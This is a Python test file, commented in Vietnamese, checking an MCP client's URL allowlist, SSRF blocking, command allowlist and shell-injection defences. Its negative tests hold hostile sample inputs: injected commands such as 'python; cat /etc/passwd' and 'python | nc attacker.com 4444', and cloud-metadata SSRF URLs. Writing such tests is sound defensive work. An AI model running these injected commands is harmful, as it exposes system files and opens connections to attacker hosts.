"""Tests for External MCP Client security (Allowlist, Auth, and Lifecycle management)."""

import json
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from app.core.config import Settings
from app.mcp.clients import (
    ExternalMCPManager,
    MCPConnectionError,
    MCPToolWrapper,
    SSEMCPClient,
    validate_mcp_command,
    validate_mcp_url,
)
from app.service import ChatService


def test_mcp_url_allowlist_validation_success():
    """Kiểm tra URL hợp lệ nằm trong allowlist được chấp nhận."""
    allowed = {"127.0.0.1", "localhost", "mcp.vnpost.vn", ".internal.vnpost.vn"}

    # Localhost / IP
    validate_mcp_url("http://127.0.0.1:8000/sse", allowed)
    validate_mcp_url("https://localhost:9000/mcp", allowed)

    # Subdomain matching
    validate_mcp_url("https://mcp.vnpost.vn/tools", allowed)
    validate_mcp_url("https://logistics.internal.vnpost.vn/sse", allowed)


def test_mcp_url_allowlist_rejects_unauthorized_domains():
    """Kiểm tra URL ngoài allowlist bị chặn với MCPConnectionError."""
    allowed = {"127.0.0.1", "localhost", "mcp.vnpost.vn"}

    with pytest.raises(MCPConnectionError, match="không nằm trong allowlist"):
        validate_mcp_url("https://evil-server.com/sse", allowed)

    with pytest.raises(MCPConnectionError, match="không nằm trong allowlist"):
        validate_mcp_url("http://192.168.1.100/mcp", allowed)


def test_mcp_url_ssrf_blocks_metadata_and_dangerous_ips():
    """Kiểm tra cơ chế chặn SSRF vào Cloud Metadata và địa chỉ mạng nhạy cảm."""
    # Metadata IP (AWS, GCP, Azure 169.254.169.254)
    with pytest.raises(MCPConnectionError, match="dải IP nhạy cảm"):
        validate_mcp_url(
            "http://169.254.169.254/latest/meta-data", allowed_hosts={"169.254.169.254"}
        )

    # Metadata hostname (GCP metadata.google.internal)
    with pytest.raises(MCPConnectionError, match="cloud metadata host"):
        validate_mcp_url(
            "http://metadata.google.internal/computeMetadata",
            allowed_hosts={"metadata.google.internal"},
        )

    # 0.0.0.0
    with pytest.raises(MCPConnectionError, match="dải IP nhạy cảm"):
        validate_mcp_url("http://0.0.0.0:8000/sse", allowed_hosts={"0.0.0.0"})

    # Scheme không an toàn (file, ftp, gopher)
    with pytest.raises(MCPConnectionError, match="Giao thức URL không an toàn"):
        validate_mcp_url("ftp://127.0.0.1/mcp", allowed_hosts={"127.0.0.1"})


def test_mcp_command_allowlist_and_injection_prevention():
    """Kiểm tra kiểm soát lệnh thực thi STDIO và chống Command Injection."""
    allowed = {"python", "python3", "uvx", "npx"}

    # Lệnh hợp lệ
    validate_mcp_command("python", allowed)
    validate_mcp_command("uvx", allowed)
    validate_mcp_command("C:\\Tools\\python.exe", allowed)

    # Lệnh không nằm trong whitelist
    with pytest.raises(MCPConnectionError, match="không nằm trong whitelist"):
        validate_mcp_command("cmd.exe", allowed)

    with pytest.raises(MCPConnectionError, match="không nằm trong whitelist"):
        validate_mcp_command("powershell", allowed)

    with pytest.raises(MCPConnectionError, match="không nằm trong whitelist"):
        validate_mcp_command("curl", allowed)

    # Chặn Command Injection qua shell metacharacters
    with pytest.raises(MCPConnectionError, match="chứa ký tự shell không an toàn"):
        validate_mcp_command("python; cat /etc/passwd", allowed)

    with pytest.raises(MCPConnectionError, match="chứa ký tự shell không an toàn"):
        validate_mcp_command("python & malicious_command", allowed)

    with pytest.raises(MCPConnectionError, match="chứa ký tự shell không an toàn"):
        validate_mcp_command("python | nc attacker.com 4444", allowed)

    with pytest.raises(MCPConnectionError, match="chứa ký tự shell không an toàn"):
        validate_mcp_command("python `whoami`", allowed)


def test_sse_mcp_client_auth_header_injection():
    """Kiểm tra SSEMCPClient tự động inject Authorization Bearer token và giữ headers bổ sung."""
    client = SSEMCPClient(
        mcp_server_url="http://127.0.0.1:8000/sse",
        headers={"X-Custom-Tenant": "vnpost-logistics"},
        auth_token="secure_mcp_jwt_token_999",
        allowed_hosts={"127.0.0.1"},
    )
    assert client.headers["Authorization"] == "Bearer secure_mcp_jwt_token_999"
    assert client.headers["X-Custom-Tenant"] == "vnpost-logistics"


def test_mcp_tool_wrapper_to_langchain_tool():
    """Kiểm tra chuyển đổi MCPToolWrapper sang StructuredTool tương thích LangChain."""

    async def mock_call(arguments):
        return f"Echo: {arguments.get('query')}"

    wrapper = MCPToolWrapper(
        tool_name="postal_calculator",
        tool_define={
            "name": "postal_calculator",
            "description": "Tính cước chuyển phát bưu chính",
            "parameters": {
                "type": "object",
                "properties": {"weight": {"type": "number"}},
                "required": ["weight"],
            },
        },
        call_fn=mock_call,
    )

    lc_tool = wrapper.to_langchain_tool()
    assert lc_tool is not None
    assert lc_tool.name == "postal_calculator"
    assert "Tính cước" in lc_tool.description


@pytest.mark.asyncio
async def test_external_mcp_manager_lifecycle():
    """Kiểm tra ExternalMCPManager nạp server, quản lý allowlist và đóng kết nối an toàn."""
    config_servers = [
        {
            "name": "secure_mcp_service",
            "transport": "sse",
            "url": "http://127.0.0.1:8000/sse",
            "auth_token": "secret_abc",
        },
        {
            "name": "blocked_service",
            "transport": "sse",
            "url": "http://untrusted-server.com/sse",
            "auth_token": "secret_xyz",
        },
    ]

    settings = Settings(
        checkpointer_enabled=False,
        demo_mode=True,
        external_mcp_servers_json=json.dumps(config_servers),
        mcp_client_allowed_urls="127.0.0.1,localhost",
    )

    manager = ExternalMCPManager(settings)

    mock_client = MagicMock()
    mock_client.tools = {
        "calculate_postage": MCPToolWrapper(
            tool_name="calculate_postage",
            tool_define={"name": "calculate_postage", "description": "Calc postage"},
            call_fn=AsyncMock(),
        )
    }
    mock_client.close = AsyncMock()

    with patch.object(
        SSEMCPClient, "create", new=AsyncMock(return_value=mock_client)
    ) as mock_create:
        await manager.initialize()

        # Server hợp lệ được khởi tạo, server bị chặn bị bỏ qua an toàn mà không crash manager
        assert mock_create.call_count == 1
        assert "secure_mcp_service" in manager.clients
        assert "blocked_service" not in manager.clients
        assert len(manager.tools) == 1
        assert "calculate_postage" in manager.tools

        # Kiểm tra đóng kết nối khi tắt dịch vụ
        await manager.close()
        mock_client.close.assert_called_once()
        assert len(manager.clients) == 0
        assert len(manager.tools) == 0


@pytest.mark.asyncio
async def test_chat_service_mcp_lifecycle_integration():
    """Kiểm tra ChatService tích hợp mcp_manager trong cả warmup và close."""
    settings = Settings(checkpointer_enabled=False, demo_mode=True)
    service = ChatService(settings)

    assert hasattr(service, "mcp_manager")
    assert isinstance(service.mcp_manager, ExternalMCPManager)

    # Mock initialize & close để xác minh hook vòng đời
    service.mcp_manager.initialize = AsyncMock()
    service.mcp_manager.close = AsyncMock()

    await service.warmup()
    service.mcp_manager.initialize.assert_called_once()

    await service.close()
    service.mcp_manager.close.assert_called_once()
